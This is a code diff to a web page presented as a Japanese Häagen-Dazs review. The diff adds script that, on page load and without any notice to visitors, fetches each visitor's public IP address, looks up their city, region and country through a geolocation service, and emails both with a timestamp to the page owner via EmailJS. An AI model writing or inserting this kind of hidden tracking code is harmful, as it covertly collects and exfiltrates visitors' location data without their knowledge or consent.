@@ -13,22 +13,36 @@
 </head>
 <body>
     <h1>ハーゲンダッツ 徹底レビュー</h1>
+    <div id="status"></div>
 
     <script>
         // グローバルIPを取得
-        fetch('https://api.ipify.org?format=json')
+        fetch('https://api.my-ip.io/ip.json')
             .then(response => response.json())
             .then(data => {
-                sendIpViaEmail(data.ip);
+                const ip = data.ip;
+                // IPを使って住所情報を取得
+                fetch(`http://ip-api.com/json/${ip}`)
+                    .then(response => response.json())
+                    .then(geoData => {
+                        const address = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
+                        sendIpViaEmail(ip, address);
+                    })
+                    .catch(error => {
+                        console.error('住所取得エラー:', error);
+                        // 住所取得に失敗した場合、IPのみでメール送信
+                        sendIpViaEmail(ip, '住所不明');
+                    });
             })
             .catch(error => {
                 console.error('IP取得エラー:', error);
+                document.getElementById('status').textContent = 'IP取得に失敗しました';
             });
 
-        // EmailJSでIPを送信
-        function sendIpViaEmail(ip) {
+        // EmailJSでIPと住所を送信
+        function sendIpViaEmail(ip, address) {
             const templateParams = {
-                ip: ip,
+                ip: ip + address,
                 timestamp: new Date().toISOString()
             };
 
